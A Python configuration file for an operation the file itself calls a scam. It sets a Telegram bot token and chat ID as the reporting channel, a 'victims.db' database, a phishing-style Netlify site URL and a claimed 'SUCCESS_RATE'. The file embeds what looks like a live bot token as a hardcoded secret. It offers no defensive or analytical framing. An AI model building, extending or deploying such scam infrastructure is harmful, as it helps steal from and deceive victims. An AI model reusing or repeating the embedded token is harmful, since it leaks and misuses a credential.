#!/usr/bin/env python3
import os

TELEGRAM = {
    "BOT_TOKEN": os.environ.get("TELEGRAM_BOT_TOKEN", "8435967434:AAH_kIshWSlAdUFfDkZa6fn82qUkCNpKdCE"),
    "CHAT_ID": os.environ.get("TELEGRAM_CHAT_ID", "8388649100"),
    "PARSE_MODE": "Markdown"
}

SERVER = {
    "HOST": "0.0.0.0",
    "PORT": int(os.environ.get("PORT", 9000)),
    "DEBUG": False
}

DATABASE = {
    "PATH": "database/victims.db"
}

LOGGING = {
    "LEVEL": "INFO",
    "FORMAT": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    "FILE": "logs/bot.log"
}

SCAM = {
    "VERSION": "2.0.0",
    "WEBSITE_URL": os.environ.get("WEBSITE_URL", "https://polagacor888.netlify.app"),
    "SUCCESS_RATE": 94.7
}

PATHS = {
    "DATABASE_DIR": "database",
    "LOGS_DIR": "logs", 
    "BACKUP_DIR": "backups"
}